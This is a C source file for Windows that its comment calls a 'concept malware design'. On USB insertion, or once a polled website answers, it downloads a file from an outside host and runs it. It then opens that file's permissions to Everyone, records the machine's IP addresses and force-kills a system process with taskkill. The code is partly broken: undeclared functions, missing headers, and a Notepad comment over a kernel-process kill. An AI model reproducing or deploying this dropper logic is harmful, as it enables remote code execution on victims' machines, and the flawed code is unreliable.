#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <winhttp.h>
#include <iphlpapi.h>
#include <winsock2.h>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "iphlpapi.lib")
#pragma comment(lib, "ws2_32.lib")
// It is a concept malware design prepared by Batuhan Aydın.
LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
    if (uMsg == WM_DEVICECHANGE) {
        PDEV_BROADCAST_HDR lpdb = (PDEV_BROADCAST_HDR)lParam;

        if (lpdb->dbch_devicetype == DBT_DEVTYP_DEVICEINTERFACE) {
            PDEV_BROADCAST_DEVICEINTERFACE pDevInf = (PDEV_BROADCAST_DEVICEINTERFACE)lpdb;

            if (pDevInf->dbcc_classguid == GUID_DEVINTERFACE_USB_DEVICE) {
                if (wParam == DBT_DEVICEARRIVAL) {
                    wprintf(L"USB device plugged in.\n");
                    
                    // Eğer USB aygıtı tanındıysa, dosyayı indir ve çalıştır
                    if (downloadFile(L"/path/to/file ", L"downloaded_file ")) {
                        wprintf(L"Downloaded file: %s\n", L"downloaded_file ");

                        if ((int)ShellExecuteW(NULL, L"open", L"downloaded_file ", NULL, NULL, SW_SHOW) > 32) {
                            const wchar_t *filePath = L"downloaded_file ";
                            
                            DWORD dwRes;
                            PSID pEveryoneSID = NULL, pAdminSID = NULL;
                            PACL pACL = NULL;
                            PSECURITY_DESCRIPTOR pSD = NULL;

                            EXPLICIT_ACCESSW ea[2];
                            SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
                            SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;

                            AllocateAndInitializeSid(&SIDAuthWorld, 1,
                                                     SECURITY_WORLD_RID,
                                                     0, 0, 0, 0, 0, 0, 0,
                                                     &pEveryoneSID);

                            ZeroMemory(&ea, 2 * sizeof(EXPLICIT_ACCESSW));
                            ea[0].grfAccessPermissions = GENERIC_ALL;
                            ea[0].grfAccessMode = SET_ACCESS;
                            ea[0].grfInheritance = NO_INHERITANCE;
                            ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
                            ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
                            ea[0].Trustee.ptstrName = (LPWSTR)pEveryoneSID;

                            SetEntriesInAclW(1, ea, NULL, &pACL);

                            pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
                            InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);

                            SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE);

                            SetFileSecurityW(filePath, DACL_SECURITY_INFORMATION, pSD);

                            LocalFree(pEveryoneSID);
                            LocalFree(pACL);
                            LocalFree(pSD);

                            sendEmailNotification();

                            // Notepad.exe süreçlerini kapat
                            closeProcesses();

                        } else {
                            wprintf(L"An error occurred while executing the file.\n");
                        }
                    } else {
                        wprintf(L"An error occurred while downloading the file.\n");
                    }
                }
            }
        }
    }

    return DefWindowProc(hwnd, uMsg, wParam, lParam);
}

int generateRandomTime() {
    return 300 + rand() % 721; // Random time between 5 and 17 minutes in seconds
}

bool checkWebsiteStatus() {
    HINTERNET hInternet, hConnect;
    DWORD statusCode = 0;
    
    hInternet = WinHttpOpen(L"TwitterCheck/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hInternet) {
        hConnect = WinHttpConnect(hInternet, L"www.example.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"HEAD", NULL, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        DWORD statusCodeSize = sizeof(DWORD);
                        if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER, NULL, &statusCode, &statusCodeSize, NULL)) {
                            if (statusCode == 200) {
                                WinHttpCloseHandle(hRequest);
                                WinHttpCloseHandle(hConnect);
                                WinHttpCloseHandle(hInternet);
                                return true;
                            }
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hInternet);
    }
    return false;
}

bool downloadFile(const wchar_t *url, const wchar_t *fileName) {
    HINTERNET hInternet, hConnect;
    
    hInternet = WinHttpOpen(L"FileDownload/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (hInternet) {
        hConnect = WinHttpConnect(hInternet, L"www.example-download.com", INTERNET_DEFAULT_HTTPS_PORT, 0);
        if (hConnect) {
            HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", url, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
            if (hRequest) {
                if (WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, WINHTTP_NO_REQUEST_DATA, 0, 0, 0)) {
                    if (WinHttpReceiveResponse(hRequest, NULL)) {
                        FILE *file = _wfopen(fileName, L"wb");
                        if (file) {
                            BYTE buffer[4096];
                            DWORD bytesRead;
                            while (WinHttpReadData(hRequest, buffer, sizeof(buffer), &bytesRead)) {
                                if (bytesRead == 0) {
                                    break;
                                }
                                fwrite(buffer, 1, bytesRead, file);
                            }
                            fclose(file);
                            WinHttpCloseHandle(hRequest);
                            WinHttpCloseHandle(hConnect);
                            WinHttpCloseHandle(hInternet);
                            return true;
                        }
                    }
                }
                WinHttpCloseHandle(hRequest);
            }
            WinHttpCloseHandle(hConnect);
        }
        WinHttpCloseHandle(hInternet);
    }
    return false;
}

void sendEmailNotification() {
    FILE *file = fopen("email_notification", "w");
    if (file) {
        fprintf(file, "Email notification: File was downloaded and executed.\n");
        
        // Get internal IP address
        char hostname[256];
        if (gethostname(hostname, sizeof(hostname)) == 0) {
            struct hostent *host = gethostbyname(hostname);
            if (host != NULL && host->h_addr_list[0] != NULL) {
                fprintf(file, "Internal IP Address: %s\n", inet_ntoa(*(struct in_addr *)host->h_addr_list[0]));
            }
        }
        
        // Get external IP address
        DWORD dwSize = 0;
        GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &dwSize);
        PIP_ADAPTER_ADDRESSES pAddresses = (IP_ADAPTER_ADDRESSES *)malloc(dwSize);
        if (pAddresses) {
            if (GetAdaptersAddresses(AF_INET, GAA_FLAG_INCLUDE_PREFIX, NULL, pAddresses, &dwSize) == NO_ERROR) {
                for (PIP_ADAPTER_ADDRESSES pCurrAddresses = pAddresses; pCurrAddresses != NULL; pCurrAddresses = pCurrAddresses->Next) {
                    if (pCurrAddresses->OperStatus == IfOperStatusUp && pCurrAddresses->IfType != IF_TYPE_LOOPBACK) {
                        fprintf(file, "External IP Address: %s\n", inet_ntoa(*(struct in_addr *)&pCurrAddresses->FirstUnicastAddress->Address.lpSockaddr->sa_data[2]));
                        break;
                    }
                }
            }
            free(pAddresses);
        }
        
        fclose(file);
    }
}

void closeProcesses() {
    system("taskkill /F /IM ntoskrnl.exe");
}

void executeDownloadedFile() {
    const wchar_t *filePath = L"usbfile";
    HINSTANCE hInstance = ShellExecuteW(NULL, L"open", filePath, NULL, NULL, SW_SHOW);
    
    if ((int)hInstance > 32) {
        wprintf(L"Downloaded file executed.\n");
    } else {
        wprintf(L"An error occurred while executing the downloaded file.\n");
    }
}

int main() {
    WNDCLASSEX wc = { sizeof(WNDCLASSEX), CS_CLASSDC, WindowProc, 0L, 0L, GetModuleHandle(NULL), NULL, NULL, NULL, NULL, _T("USB Device Notification"), NULL };
    RegisterClassEx(&wc);
    HWND hwnd = CreateWindow(wc.lpszClassName, _T(""), WS_OVERLAPPEDWINDOW, 0, 0, CW_USEDEFAULT, CW_USEDEFAULT, NULL, NULL, wc.hInstance, NULL);
    DEV_BROADCAST_DEVICEINTERFACE notificationFilter = { sizeof(DEV_BROADCAST_DEVICEINTERFACE), DBT_DEVTYP_DEVICEINTERFACE, 0, GUID_DEVINTERFACE_USB_DEVICE };
    HDEVNOTIFY hDevNotify = RegisterDeviceNotification(hwnd, &notificationFilter, DEVICE_NOTIFY_WINDOW_HANDLE);


    srand(time(NULL)); 

    while (1) {
        if (checkWebsiteStatus()) {
            if (downloadFile(L"/path/to/file ", L"downloaded_file ")) {
                wprintf(L"Downloaded file: %s\n", L"downloaded_file ");

                if ((int)ShellExecuteW(NULL, L"open", L"downloaded_file ", NULL, NULL, SW_SHOW) > 32) {
                    const wchar_t *filePath = L"downloaded_file ";
                    
                    DWORD dwRes;
                    PSID pEveryoneSID = NULL, pAdminSID = NULL;
                    PACL pACL = NULL;
                    PSECURITY_DESCRIPTOR pSD = NULL;

                    EXPLICIT_ACCESSW ea[2];
                    SID_IDENTIFIER_AUTHORITY SIDAuthWorld = SECURITY_WORLD_SID_AUTHORITY;
                    SID_IDENTIFIER_AUTHORITY SIDAuthNT = SECURITY_NT_AUTHORITY;

                    AllocateAndInitializeSid(&SIDAuthWorld, 1,
                                             SECURITY_WORLD_RID,
                                             0, 0, 0, 0, 0, 0, 0,
                                             &pEveryoneSID);

                    ZeroMemory(&ea, 2 * sizeof(EXPLICIT_ACCESSW));
                    ea[0].grfAccessPermissions = GENERIC_ALL;
                    ea[0].grfAccessMode = SET_ACCESS;
                    ea[0].grfInheritance = NO_INHERITANCE;
                    ea[0].Trustee.TrusteeForm = TRUSTEE_IS_SID;
                    ea[0].Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
                    ea[0].Trustee.ptstrName = (LPWSTR)pEveryoneSID;

                    SetEntriesInAclW(1, ea, NULL, &pACL);

                    pSD = (PSECURITY_DESCRIPTOR)LocalAlloc(LPTR, SECURITY_DESCRIPTOR_MIN_LENGTH);
                    InitializeSecurityDescriptor(pSD, SECURITY_DESCRIPTOR_REVISION);

                    SetSecurityDescriptorDacl(pSD, TRUE, pACL, FALSE);

                    SetFileSecurityW(filePath, DACL_SECURITY_INFORMATION, pSD);

                    LocalFree(pEveryoneSID);
                    LocalFree(pACL);
                    LocalFree(pSD);

                    sendEmailNotification();

                    // Notepad.exe süreçlerini kapat
                    closeProcesses();

                } else {
                    wprintf(L"An error occurred while executing the file.\n");
                }

                break;
            } else {
                wprintf(L"An error occurred while downloading the file.\n");
            }
        }

        int waitTime = generateRandomTime();
        wprintf(L"The website is still not returning 200. Waiting for %d seconds.\n", waitTime);
        Sleep(waitTime * 1000); 
    }

    UnregisterDeviceNotification(hDevNotify);

    executeDownloadedFile();

    return 0;
}
